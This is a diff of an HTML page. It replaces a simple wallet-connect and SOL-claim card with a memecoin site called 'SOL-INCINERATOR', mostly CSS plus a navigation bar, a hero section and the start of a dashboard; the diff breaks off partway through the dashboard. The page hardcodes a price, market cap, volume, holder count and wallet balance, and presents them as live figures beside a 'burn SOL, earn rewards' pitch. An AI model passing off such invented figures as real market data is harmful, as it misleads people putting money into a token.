@@ -1,518 +1,1783 @@
 <!DOCTYPE html>
 <html lang="de">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Connect Wallet</title>
-  <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      min-height: 100vh;
-      font-family: Arial, Helvetica, sans-serif;
-      background:
-        radial-gradient(circle at 15% 15%, #34206b 0%, transparent 35%),
-        radial-gradient(circle at 85% 85%, #063f36 0%, transparent 35%),
-        #07080d;
-      color: white;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 20px;
-    }
-    .card {
-      width: 100%;
-      max-width: 480px;
-      padding: 32px;
-      border-radius: 28px;
-      background: rgba(18, 20, 29, 0.92);
-      border: 1px solid rgba(255,255,255,.08);
-      box-shadow: 0 30px 100px rgba(0,0,0,.55);
-      backdrop-filter: blur(20px);
-    }
-    .logo {
-      width: 66px;
-      height: 66px;
-      margin: 0 auto 20px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      border-radius: 20px;
-      font-size: 30px;
-      background: linear-gradient(135deg, #7048ff, #9b7cff);
-      box-shadow: 0 12px 40px rgba(112,72,255,.45);
-    }
-    h1 { text-align: center; font-size: 30px; margin-bottom: 9px; }
-    .subtitle {
-      text-align: center;
-      color: #969aa8;
-      font-size: 14px;
-      margin-bottom: 25px;
-      line-height: 1.5;
-    }
-    .main-button {
-      width: 100%;
-      padding: 16px;
-      border: 0;
-      border-radius: 15px;
-      color: white;
-      background: linear-gradient(135deg, #7048ff, #8b68ff);
-      font-size: 16px;
-      font-weight: 700;
-      cursor: pointer;
-      transition: .2s;
-    }
-    .main-button:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 12px 30px rgba(112,72,255,.3);
-    }
-    .wallet-list { display: none; margin-top: 15px; }
-    .wallet-list.open { display: block; }
-    .wallet {
-      width: 100%;
-      display: flex;
-      align-items: center;
-      gap: 14px;
-      padding: 14px;
-      margin-bottom: 9px;
-      border-radius: 14px;
-      border: 1px solid rgba(255,255,255,.07);
-      background: #151720;
-      color: white;
-      cursor: pointer;
-      text-align: left;
-      transition: .2s;
-    }
-    .wallet:hover {
-      background: #20222e;
-      border-color: rgba(255,255,255,.15);
-      transform: translateY(-1px);
-    }
-    .wallet-icon {
-      width: 44px;
-      height: 44px;
-      border-radius: 13px;
-      background: #252735;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 23px;
-      flex-shrink: 0;
-    }
-    .wallet-name { font-size: 15px; font-weight: 700; }
-    .wallet-network { margin-top: 3px; color: #858a99; font-size: 12px; }
-    .connected { display: none; margin-top: 20px; }
-    .connected.open { display: block; }
-    .connected-title { color: #aeb2bf; font-size: 13px; margin-bottom: 8px; }
-    .account {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      padding: 12px;
-      margin-bottom: 8px;
-      border-radius: 12px;
-      background: #151720;
-      border: 1px solid rgba(255,255,255,.07);
-    }
-    .account-info { flex: 1; min-width: 0; }
-    .account-wallet { color: #fff; font-size: 12px; font-weight: 700; margin-bottom: 4px; }
-    .account-address { color: #858a99; font-size: 11px; word-break: break-all; }
-    .remove { border: 0; background: transparent; color: #858a99; cursor: pointer; padding: 5px; }
-    .secondary {
-      width: 100%;
-      padding: 14px;
-      margin-top: 8px;
-      border-radius: 14px;
-      border: 1px solid rgba(255,255,255,.08);
-      background: #171923;
-      color: white;
-      font-weight: 700;
-      cursor: pointer;
-    }
-    .secondary:hover { background: #20222e; }
-    .status {
-      display: none;
-      margin-top: 15px;
-      padding: 13px;
-      border-radius: 12px;
-      background: #151720;
-      color: #aeb2bf;
-      font-size: 12px;
-      line-height: 1.5;
-      word-break: break-word;
-    }
-    .status.open { display: block; }
-    .warning {
-      margin-top: 18px;
-      text-align: center;
-      color: #737784;
-      font-size: 11px;
-      line-height: 1.5;
-    }
-    #claimPage { display: none; }
-    .claim-box {
-      min-height: 320px;
-      margin-top: 18px;
-      border-radius: 18px;
-      border: 1px solid rgba(255,255,255,.07);
-      background: #10121a;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-      padding: 30px;
-    }
-    .claim-label { color: #858a99; font-size: 12px; letter-spacing: 4px; }
-    .claim-amount { margin: 15px 0; font-size: 40px; font-weight: 800; }
-    .sol-icon { font-size: 50px; margin-bottom: 18px; }
-    .claim-text { color: #858a99; font-size: 13px; line-height: 1.6; max-width: 350px; }
-    .back-button {
-      width: 100%;
-      margin-top: 14px;
-      padding: 13px;
-      border: 0;
-      background: transparent;
-      color: #9a83ff;
-      cursor: pointer;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOL-INCINERATOR</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/bignumber.js/9.1.2/bignumber.min.js"></script>
+    <style>
+        /* ===== RESET & BASE ===== */
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        html { scroll-behavior: smooth; }
+        body {
+            font-family: 'JetBrains Mono', monospace;
+            background: #0a0a0a;
+            color: #e0e0e0;
+            min-height: 100vh;
+            overflow-x: hidden;
+            line-height: 1.6;
+        }
+        a { color: #00ff41; text-decoration: none; }
+        a:hover { text-shadow: 0 0 8px #00ff41; }
+
+        /* ===== PIXEL HEADINGS ===== */
+        h1, h2, h3, .pixel-font, .logo-text, .nav-link, .btn-wallet, .modal-title {
+            font-family: 'Press Start 2P', monospace;
+            letter-spacing: 1px;
+        }
+
+        /* ===== NAVIGATION ===== */
+        .navbar {
+            position: fixed; top: 0; left: 0; right: 0;
+            z-index: 1000;
+            background: rgba(10, 10, 10, 0.95);
+            border-bottom: 1px solid #00ff41;
+            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 0 24px;
+            height: 64px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .nav-left { display: flex; align-items: center; gap: 12px; }
+        .nav-logo-icon {
+            width: 36px; height: 36px;
+            background: #00ff41;
+            clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
+            animation: pulseGlow 2s ease-in-out infinite;
+            flex-shrink: 0;
+        }
+        @keyframes pulseGlow {
+            0%, 100% { box-shadow: 0 0 8px #00ff41; }
+            50% { box-shadow: 0 0 20px #00ff41, 0 0 40px #00ff4133; }
+        }
+        .logo-text {
+            font-size: 14px;
+            color: #00ff41;
+            text-shadow: 0 0 10px #00ff41;
+            white-space: nowrap;
+        }
+        .nav-center { display: flex; align-items: center; gap: 4px; }
+        .nav-link {
+            font-size: 11px;
+            color: #a0a0a0;
+            padding: 8px 16px;
+            border: 1px solid transparent;
+            transition: all 0.3s ease;
+            cursor: pointer;
+            background: transparent;
+            font-family: 'Press Start 2P', monospace;
+        }
+        .nav-link:hover, .nav-link.active {
+            color: #00ff41;
+            border-color: #00ff41;
+            text-shadow: 0 0 8px #00ff41;
+            box-shadow: inset 0 0 20px rgba(0,255,65,0.05);
+        }
+        .nav-right { display: flex; align-items: center; gap: 12px; }
+
+        .btn-wallet {
+            font-family: 'Press Start 2P', monospace;
+            font-size: 10px;
+            padding: 10px 18px;
+            border: 1px solid #00ff41;
+            background: transparent;
+            color: #00ff41;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-shadow: 0 0 5px #00ff41;
+            white-space: nowrap;
+        }
+        .btn-wallet:hover {
+            background: rgba(0,255,65,0.1);
+            box-shadow: 0 0 20px rgba(0,255,65,0.3);
+        }
+        .btn-wallet.connected {
+            border-color: #00ff41;
+            background: rgba(0,255,65,0.05);
+        }
+        .btn-wallet.connected .wallet-disconnect {
+            color: #ff4444;
+            border-color: #ff4444;
+        }
+        .btn-wallet .wallet-disconnect {
+            font-size: 10px;
+            padding: 2px 8px;
+            border: 1px solid #ff4444;
+            color: #ff4444;
+            background: transparent;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-left: 8px;
+        }
+        .btn-wallet .wallet-disconnect:hover {
+            background: rgba(255,68,68,0.15);
+            box-shadow: 0 0 12px rgba(255,68,68,0.3);
+        }
+
+        .hamburger {
+            display: none;
+            flex-direction: column;
+            gap: 5px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+        }
+        .hamburger span {
+            width: 24px; height: 2px;
+            background: #00ff41;
+            transition: all 0.3s;
+            box-shadow: 0 0 6px #00ff41;
+        }
+        .hamburger.active span:nth-child(1) { transform: rotate(45deg) translate(5px, 5px); }
+        .hamburger.active span:nth-child(2) { opacity: 0; }
+        .hamburger.active span:nth-child(3) { transform: rotate(-45deg) translate(5px, -5px); }
+
+        /* Mobile nav drawer */
+        .mobile-nav {
+            display: none;
+            position: fixed;
+            top: 64px; left: 0; right: 0;
+            background: rgba(10,10,10,0.98);
+            border-bottom: 1px solid #00ff41;
+            padding: 16px;
+            flex-direction: column;
+            gap: 8px;
+            z-index: 999;
+        }
+        .mobile-nav.open { display: flex; }
+        .mobile-nav .nav-link {
+            font-size: 10px;
+            padding: 12px 16px;
+            width: 100%;
+            text-align: left;
+        }
+
+        /* ===== HERO ===== */
+        .hero {
+            padding: 120px 24px 80px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -50%; left: -50%;
+            width: 200%; height: 200%;
+            background: radial-gradient(circle at center, rgba(0,255,65,0.03) 0%, transparent 60%);
+            animation: heroGlow 6s ease-in-out infinite;
+            pointer-events: none;
+        }
+        @keyframes heroGlow {
+            0%, 100% { transform: scale(1); opacity: 0.5; }
+            50% { transform: scale(1.2); opacity: 1; }
+        }
+        .hero-content { position: relative; z-index: 1; }
+        .hero-badge {
+            display: inline-block;
+            font-size: 10px;
+            font-family: 'Press Start 2P', monospace;
+            color: #00ff41;
+            border: 1px solid #00ff41;
+            padding: 6px 16px;
+            margin-bottom: 24px;
+            animation: flicker 3s infinite;
+        }
+        @keyframes flicker {
+            0%, 100% { opacity: 1; }
+            92% { opacity: 1; }
+            93% { opacity: 0.3; }
+            94% { opacity: 1; }
+            96% { opacity: 0.2; }
+            97% { opacity: 1; }
+        }
+        .hero-title {
+            font-family: 'Press Start 2P', monospace;
+            font-size: clamp(28px, 6vw, 64px);
+            color: #00ff41;
+            text-shadow: 0 0 20px #00ff41, 0 0 40px rgba(0,255,65,0.3);
+            margin-bottom: 16px;
+            line-height: 1.2;
+        }
+        .hero-sub {
+            font-size: clamp(14px, 2vw, 20px);
+            color: #888;
+            margin-bottom: 32px;
+            max-width: 700px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .hero-stats {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 16px;
+            margin-bottom: 32px;
+        }
+        .hero-stat {
+            border: 1px solid #00ff4144;
+            padding: 12px 20px;
+            min-width: 140px;
+            background: rgba(0,255,65,0.02);
+        }
+        .hero-stat-label {
+            font-size: 9px;
+            font-family: 'Press Start 2P', monospace;
+            color: #666;
+            margin-bottom: 6px;
+        }
+        .hero-stat-value {
+            font-size: 18px;
+            color: #00ff41;
+            font-weight: 700;
+            text-shadow: 0 0 8px rgba(0,255,65,0.3);
+        }
+        .hero-cta {
+            display: flex;
+            gap: 16px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        .btn-primary {
+            font-family: 'Press Start 2P', monospace;
+            font-size: 12px;
+            padding: 14px 32px;
+            border: 1px solid #00ff41;
+            background: transparent;
+            color: #00ff41;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-shadow: 0 0 8px #00ff41;
+        }
+        .btn-primary:hover {
+            background: rgba(0,255,65,0.1);
+            box-shadow: 0 0 30px rgba(0,255,65,0.3), inset 0 0 30px rgba(0,255,65,0.05);
+        }
+        .btn-secondary {
+            font-family: 'Press Start 2P', monospace;
+            font-size: 12px;
+            padding: 14px 32px;
+            border: 1px solid #444;
+            background: transparent;
+            color: #888;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .btn-secondary:hover {
+            border-color: #00ff41;
+            color: #00ff41;
+        }
+
+        /* ===== SECTION COMMON ===== */
+        .section {
+            padding: 60px 24px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .section-title {
+            font-family: 'Press Start 2P', monospace;
+            font-size: 18px;
+            color: #00ff41;
+            text-shadow: 0 0 10px #00ff41;
+            margin-bottom: 32px;
+            text-align: center;
+        }
+        .section-title span {
+            border-bottom: 2px solid #00ff41;
+            padding-bottom: 8px;
+        }
+
+        /* ===== DASHBOARD GRID ===== */
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+            gap: 16px;
+            margin-bottom: 40px;
+        }
+        .dash-card {
+            border: 1px solid #00ff4133;
+            padding: 20px;
+            background: rgba(0,255,65,0.02);
+            transition: all 0.3s;
+        }
+        .dash-card:hover {
+            border-color: #00ff41;
+            box-shadow: 0 0 20px rgba(0,255,65,0.08);
+        }
+        .dash-card-label {
+            font-size: 9px;
+            font-family: 'Press Start 2P', monospace;
+            color: #666;
+            margin-bottom: 8px;
+        }
+        .dash-card-value {
+            font-size: 22px;
+            font-weight: 700;
+            color: #fff;
+        }
+        .dash-card-value.green { color: #00ff41; }
+        .dash-card-value.red { color: #ff4444; }
+        .dash-card-value.small { font-size: 16px; }
+        .dash-card-change {
+            font-size: 12px;
+            margin-top: 4px;
+        }
+        .dash-card-change.up { color: #00ff41; }
+        .dash-card-change.down { color: #ff4444; }
+
+        /* ===== TRADING PANEL ===== */
+        .trading-panel {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin-bottom: 40px;
+        }
+        .trade-card {
+            border: 1px solid #00ff4133;
+            padding: 24px;
+            background: rgba(0,255,65,0.02);
+        }
+        .trade-card h3 {
+            font-size: 12px;
+            color: #00ff41;
+            margin-bottom: 16px;
+            font-family: 'Press Start 2P', monospace;
+        }
+        .trade-input-group {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+        .trade-input {
+            flex: 1;
+            background: #111;
+            border: 1px solid #333;
+            padding: 12px 16px;
+            color: #fff;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 14px;
+            outline: none;
+            transition: border 0.3s;
+        }
+        .trade-input:focus {
+            border-color: #00ff41;
+            box-shadow: 0 0 10px rgba(0,255,65,0.15);
+        }
+        .trade-input::placeholder { color: #444; }
+        .trade-select {
+            background: #111;
+            border: 1px solid #333;
+            padding: 12px;
+            color: #00ff41;
+            font-family: 'Press Start 2P', monospace;
+            font-size: 10px;
+            cursor: pointer;
+            min-width: 80px;
+        }
+        .trade-btn {
+            width: 100%;
+            padding: 14px;
+            font-family: 'Press Start 2P', monospace;
+            font-size: 11px;
+            border: 1px solid;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-shadow: 0 0 5px;
+        }
+        .trade-btn.buy {
+            border-color: #00ff41;
+            color: #00ff41;
+            background: transparent;
+        }
+        .trade-btn.buy:hover {
+            background: rgba(0,255,65,0.1);
+            box-shadow: 0 0 20px rgba(0,255,65,0.2);
+        }
+        .trade-btn.sell {
+            border-color: #ff4444;
+            color: #ff4444;
+            background: transparent;
+        }
+        .trade-btn.sell:hover {
+            background: rgba(255,68,68,0.1);
+            box-shadow: 0 0 20px rgba(255,68,68,0.2);
+        }
+
+        /* ===== CHART PLACEHOLDER ===== */
+        .chart-container {
+            border: 1px solid #00ff4133;
+            padding: 24px;
+            margin-bottom: 40px;
+            background: rgba(0,255,65,0.02);
+            position: relative;
+            overflow: hidden;
+        }
+        .chart-container h3 {
+            font-size: 12px;
+            color: #00ff41;
+            margin-bottom: 16px;
+            font-family: 'Press Start 2P', monospace;
+        }
+        .chart-canvas {
+            width: 100%;
+            height: 300px;
+            background: #0a0a0a;
+            position: relative;
+            overflow: hidden;
+        }
+        .chart-canvas canvas {
+            width: 100%;
+            height: 100%;
+        }
+        .chart-grid-line {
+            position: absolute;
+            left: 0; right: 0;
+            height: 1px;
+            background: rgba(0,255,65,0.05);
+        }
+
+        /* ===== TRANSACTIONS ===== */
+        .tx-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 40px;
+        }
+        .tx-table th {
+            font-family: 'Press Start 2P', monospace;
+            font-size: 10px;
+            color: #666;
+            padding: 12px 16px;
+            border-bottom: 1px solid #00ff4133;
+            text-align: left;
+        }
+        .tx-table td {
+            padding: 12px 16px;
+            border-bottom: 1px solid #111;
+            font-size: 12px;
+            color: #aaa;
+        }
+        .tx-table tr:hover td {
+            background: rgba(0,255,65,0.02);
+        }
+        .tx-type { font-weight: 600; }
+        .tx-type.buy { color: #00ff41; }
+        .tx-type.sell { color: #ff4444; }
+        .tx-address { color: #00ff41; font-size: 11px; }
+        .tx-time { color: #555; font-size: 11px; }
+
+        /* ===== TRENDING ===== */
+        .trending-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 12px;
+            margin-bottom: 40px;
+        }
+        .trending-item {
+            border: 1px solid #00ff4133;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        .trending-item:hover {
+            border-color: #00ff41;
+            box-shadow: 0 0 15px rgba(0,255,65,0.1);
+        }
+        .trending-icon {
+            width: 32px; height: 32px;
+            border: 1px solid #00ff41;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+            flex-shrink: 0;
+        }
+        .trending-info { flex: 1; min-width: 0; }
+        .trending-name {
+            font-family: 'Press Start 2P', monospace;
+            font-size: 9px;
+            color: #fff;
+            margin-bottom: 2px;
+        }
+        .trending-ticker {
+            font-size: 10px;
+            color: #00ff41;
+        }
+        .trending-price {
+            font-size: 13px;
+            font-weight: 600;
+            color: #fff;
+        }
+        .trending-change {
+            font-size: 11px;
+        }
+        .trending-change.up { color: #00ff41; }
+        .trending-change.down { color: #ff4444; }
+
+        /* ===== WALLET MODAL ===== */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.85);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(4px);
+        }
+        .modal-overlay.open { display: flex; }
+        .modal {
+            background: #0d0d0d;
+            border: 1px solid #00ff41;
+            padding: 32px;
+            width: 90%;
+            max-width: 420px;
+            position: relative;
+            box-shadow: 0 0 40px rgba(0,255,65,0.1), 0 0 80px rgba(0,255,65,0.05);
+            animation: modalIn 0.3s ease;
+        }
+        @keyframes modalIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        .modal-close {
+            position: absolute;
+            top: 16px; right: 16px;
+            background: none;
+            border: 1px solid #444;
+            color: #666;
+            font-size: 16px;
+            width: 32px; height: 32px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Press Start 2P', monospace;
+            transition: all 0.3s;
+        }
+        .modal-close:hover {
+            border-color: #ff4444;
+            color: #ff4444;
+        }
+        .modal-title {
+            font-size: 16px;
+            color: #00ff41;
+            text-shadow: 0 0 8px #00ff41;
+            margin-bottom: 8px;
+        }
+        .modal-subtitle {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 24px;
+        }
+        .wallet-option {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 16px;
+            border: 1px solid #222;
+            margin-bottom: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            background: transparent;
+            width: 100%;
+            text-align: left;
+            color: #e0e0e0;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .wallet-option:hover {
+            border-color: #00ff41;
+            box-shadow: 0 0 15px rgba(0,255,65,0.1);
+            background: rgba(0,255,65,0.03);
+        }
+        .wallet-option.disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .wallet-option.disabled:hover {
+            border-color: #333;
+            box-shadow: none;
+            background: transparent;
+        }
+        .wallet-option-icon {
+            width: 40px; height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            border: 1px solid #333;
+            flex-shrink: 0;
+        }
+        .wallet-option-info { flex: 1; min-width: 0; }
+        .wallet-option-name {
+            font-family: 'Press Start 2P', monospace;
+            font-size: 11px;
+            color: #fff;
+            margin-bottom: 2px;
+        }
+        .wallet-option-desc {
+            font-size: 11px;
+            color: #666;
+        }
+        .wallet-option-status {
+            font-size: 9px;
+            font-family: 'Press Start 2P', monospace;
+            padding: 4px 10px;
+            border: 1px solid;
+            white-space: nowrap;
+        }
+        .wallet-option-status.available {
+            color: #00ff41;
+            border-color: #00ff41;
+        }
+        .wallet-option-status.install {
+            color: #ffaa00;
+            border-color: #ffaa00;
+        }
+        .wallet-option-status.error {
+            color: #ff4444;
+            border-color: #ff4444;
+        }
+        .modal-footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 11px;
+            color: #555;
+        }
+        .modal-footer a {
+            color: #00ff41;
+            text-decoration: underline;
+        }
+        .modal-error {
+            color: #ff4444;
+            font-size: 11px;
+            margin-top: 12px;
+            padding: 8px;
+            border: 1px solid #ff4444;
+            display: none;
+        }
+        .modal-error.show { display: block; }
+        .modal-success {
+            color: #00ff41;
+            font-size: 11px;
+            margin-top: 12px;
+            padding: 8px;
+            border: 1px solid #00ff41;
+            display: none;
+        }
+        .modal-success.show { display: block; }
+
+        /* ===== FOOTER ===== */
+        .footer {
+            border-top: 1px solid #00ff4133;
+            padding: 32px 24px;
+            text-align: center;
+            color: #444;
+            font-size: 10px;
+        }
+        .footer a { color: #00ff41; }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .navbar { padding: 0 16px; }
+            .nav-center { display: none; }
+            .hamburger { display: flex; }
+            .btn-wallet { font-size: 8px; padding: 8px 12px; }
+            .logo-text { font-size: 11px; }
+            .hero { padding: 100px 16px 60px; }
+            .hero-title { font-size: 22px; }
+            .hero-stats { gap: 8px; }
+            .hero-stat { padding: 10px 14px; min-width: 100px; }
+            .hero-stat-value { font-size: 14px; }
+            .section { padding: 40px 16px; }
+            .section-title { font-size: 14px; }
+            .dashboard-grid { grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 8px; }
+            .dash-card { padding: 14px; }
+            .dash-card-value { font-size: 16px; }
+            .trading-panel { grid-template-columns: 1fr; }
+            .modal { padding: 20px; }
+            .wallet-option { padding: 12px; gap: 12px; }
+            .wallet-option-name { font-size: 9px; }
+            .tx-table th, .tx-table td { padding: 8px 10px; font-size: 10px; }
+            .trending-grid { grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); }
+            .nav-link { font-size: 9px; padding: 6px 12px; }
+        }
+        @media (max-width: 480px) {
+            .hero-title { font-size: 18px; }
+            .hero-stat { min-width: 80px; padding: 8px 10px; }
+            .hero-stat-value { font-size: 12px; }
+            .hero-stat-label { font-size: 7px; }
+            .btn-primary, .btn-secondary { font-size: 10px; padding: 10px 20px; }
+            .modal { padding: 16px; }
+            .wallet-option { padding: 10px; gap: 8px; }
+            .wallet-option-icon { width: 32px; height: 32px; font-size: 18px; }
+        }
+
+        /* ===== SCROLLBAR ===== */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #0a0a0a; }
+        ::-webkit-scrollbar-thumb { background: #00ff4133; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #00ff4166; }
+
+        /* ===== LOADING SPINNER ===== */
+        .spinner {
+            display: inline-block;
+            width: 14px; height: 14px;
+            border: 2px solid #00ff41;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 6px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ===== TOAST ===== */
+        .toast-container {
+            position: fixed;
+            bottom: 24px; right: 24px;
+            z-index: 3000;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+        .toast {
+            border: 1px solid;
+            padding: 12px 20px;
+            font-size: 11px;
+            font-family: 'Press Start 2P', monospace;
+            animation: toastIn 0.3s ease;
+            max-width: 360px;
+        }
+        .toast.success { border-color: #00ff41; color: #00ff41; background: rgba(0,255,65,0.05); }
+        .toast.error { border-color: #ff4444; color: #ff4444; background: rgba(255,68,68,0.05); }
+        .toast.info { border-color: #4a9eff; color: #4a9eff; background: rgba(74,158,255,0.05); }
+        @keyframes toastIn {
+            from { transform: translateX(100px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        /* ===== COPY TOOLTIP ===== */
+        .copy-hint {
+            font-size: 9px;
+            color: #555;
+            cursor: pointer;
+            border-bottom: 1px dashed #444;
+        }
+        .copy-hint:hover { color: #00ff41; }
+    </style>
 </head>
 <body>
 
-  <!-- CONNECT PAGE -->
-  <div class="card" id="connectPage">
-    <div class="logo">🔗</div>
-    <h1>Connect Wallet</h1>
-    <p class="subtitle">Connect your wallet to continue.</p>
-    <button class="main-button" id="connectButton">Connect Wallet</button>
-    <div class="wallet-list" id="walletList">
-      <button class="wallet" id="metamaskButton">
-        <div class="wallet-icon">🦊</div>
-        <div><div class="wallet-name">MetaMask</div><div class="wallet-network">Ethereum / EVM</div></div>
-      </button>
-      <button class="wallet" id="trustButton">
-        <div class="wallet-icon">🛡️</div>
-        <div><div class="wallet-name">Trust Wallet</div><div class="wallet-network">Ethereum / EVM</div></div>
-      </button>
-      <button class="wallet" id="phantomButton">
-        <div class="wallet-icon">👻</div>
-        <div><div class="wallet-name">Phantom</div><div class="wallet-network">Solana / Ethereum</div></div>
-      </button>
+<!-- ===== NAVIGATION ===== -->
+<nav class="navbar">
+    <div class="nav-left">
+        <div class="nav-logo-icon"></div>
+        <span class="logo-text">SOL-INCINERATOR</span>
     </div>
-    <div class="connected" id="connected">
-      <div class="connected-title">Connected wallets</div>
-      <div id="accounts"></div>
-      <button class="secondary" id="addWallet">＋ Add another wallet</button>
-      <button class="main-button" id="continueButton" style="margin-top:10px">Continue</button>
+    <div class="nav-center">
+        <button class="nav-link active" data-section="dashboard">INCINERATOR</button>
+        <button class="nav-link" data-section="tools">TOOLS</button>
+        <button class="nav-link" data-section="rewards">REWARDS</button>
     </div>
-    <div class="status" id="status"></div>
-    <div class="warning">Only your public wallet address is requested. Never enter a seed phrase, private key or wallet password.</div>
-  </div>
+    <div class="nav-right">
+        <button class="btn-wallet" id="walletButton" onclick="openWalletModal()">
+            CONNECT WALLET
+        </button>
+        <button class="hamburger" id="hamburger" onclick="toggleMobileMenu()">
+            <span></span><span></span><span></span>
+        </button>
+    </div>
+</nav>
 
-  <!-- CLAIM PAGE -->
-  <div class="card" id="claimPage">
-    <div class="logo">◎</div>
-    <h1>Claim</h1>
-    <p class="subtitle">Wallet connected successfully.</p>
-    <div class="claim-box">
-      <div class="claim-label">UNCLAIMED SOL</div>
-      <div class="claim-amount">0.0000 SOL</div>
-      <div class="sol-icon">◎</div>
-      <div class="claim-text">There are currently no rewards available to claim. Check back later.</div>
-    </div>
-    <button class="back-button" id="backButton">← Back to wallet connection</button>
-  </div>
+<!-- ===== MOBILE NAV ===== -->
+<div class="mobile-nav" id="mobileNav">
+    <button class="nav-link active" data-section="dashboard" onclick="closeMobileMenu(); scrollToSection('dashboard')">INCINERATOR</button>
+    <button class="nav-link" data-section="tools" onclick="closeMobileMenu(); scrollToSection('tools')">TOOLS</button>
+    <button class="nav-link" data-section="rewards" onclick="closeMobileMenu(); scrollToSection('rewards')">REWARDS</button>
+</div>
 
+<!-- ===== HERO ===== -->
+<section class="hero">
+    <div class="hero-content">
+        <div class="hero-badge">&#9889; SOL INCINERATOR v2.0</div>
+        <h1 class="hero-title">SOL-INCINERATOR</h1>
+        <p class="hero-sub">The most degenerate memecoin on Solana. Burn SOL, earn incinerated rewards. No utility. Pure vibes.</p>
+        <div class="hero-stats">
+            <div class="hero-stat">
+                <div class="hero-stat-label">PRICE</div>
+                <div class="hero-stat-value">$0.000042</div>
+            </div>
+            <div class="hero-stat">
+                <div class="hero-stat-label">MARKET CAP</div>
+                <div class="hero-stat-value">$4,200,069</div>
+            </div>
+            <div class="hero-stat">
+                <div class="hero-stat-label">24H VOLUME</div>
+                <div class="hero-stat-value">$694,200</div>
+            </div>
+            <div class="hero-stat">
+                <div class="hero-stat-label">HOLDERS</div>
+                <div class="hero-stat-value">13,337</div>
+            </div>
+        </div>
+        <div class="hero-cta">
+            <button class="btn-primary" onclick="scrollToSection('trade')">&#9654; BUY $INCINERATE</button>
+            <button class="btn-secondary" onclick="scrollToSection('chart')">&#9664; CHART</button>
+        </div>
+    </div>
+</section>
+
+<!-- ===== DASHBOARD SECTION ===== -->
+<section class="section" id="dashboard">
+    <h2 class="section-title"><span>// DASHBOARD</span></h2>
+
+    <div class="dashboard-grid">
+        <div class="dash-card">
+            <div class="dash-card-label">SOL BALANCE</div>
+            <div class="dash-card-value green" id="solBalance">42.69</div>
+            <div class="dash-card-change up">&#9650; +2.4%</div>
+        </div>
+        <div class="dash-card">
+            <div class="dash-card-label">WALLET</div>
+            <div class="dash-card-value small" id="walletDisplay" style="font-size:12px; word-break:break-all;">Not Connected</div>
+            <div class="dash-card-change" id="walletStatus" style="color:#555;font-size:10px;">Connect wallet to view</div>
+        </div>
+        <div class="dash-card">
+            <div class="dash-card-label">$INCINERATE BALANCE</div>
